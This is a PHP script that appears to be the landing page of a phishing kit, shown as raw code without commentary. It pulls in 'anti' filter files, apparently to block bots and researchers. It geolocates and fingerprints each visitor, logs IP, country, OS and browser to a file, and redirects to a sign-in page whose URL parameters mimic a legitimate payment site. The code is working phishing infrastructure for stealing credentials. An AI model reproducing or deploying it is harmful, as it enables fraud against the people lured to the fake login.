<?php @error_reporting();
require_once '../anti/anti0.php';
require '../anti/anti1.php';
require '../anti/anti2.php';
require '../anti/anti3.php';
require '../anti/anti4.php';
@session_start();
require 'functions.php';
function genRandString($length=5){
	$chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$randomString='';for($i=0;$i<$length;$i++){$randomString.=$chars[rand(0,strlen($chars)- 1)];
	}
	return $randomString;
}$ipInfo=clientData();
$_SESSION['randString']=genRandString(80);
$_SESSION['language']=getLanguage();
$_SESSION['ip']=isset($ipInfo['ip'])?$ipInfo['ip']:"127.0.0.1";
$_SESSION['ip_countryName']=isset($ipInfo['country_name'])?$ipInfo['country_name']:"localhost";
$_SESSION['ip_countryCode']=isset($ipInfo['country_code'])?$ipInfo['country_code']:"localhost";
$_SESSION['ip_zip']=isset($ipInfo['zip_code'])?$ipInfo['zip_code']:"localhost";
$_SESSION['ip_city']=isset($ipInfo['city'])?$ipInfo['city']:"localhost";
$_SESSION['ip_state']=isset($ipInfo['region_name'])?$ipInfo['region_name']:"localhost";
$_SESSION['ip_timezone']=isset($ipInfo['time_zone'])?$ipInfo['time_zone']:"localhost";
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");
$code="{$_SESSION['ip']} | {$dateNow} GMT | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";
$save=fopen("../log.txt","a+");
fwrite($save,$code);
fclose($save);
exit(header("Location: signin.php?country.x={$_SESSION['ip_countryCode']}&locale.x={$_SESSION['language']}_{$_SESSION['ip_countryCode']}"));
?>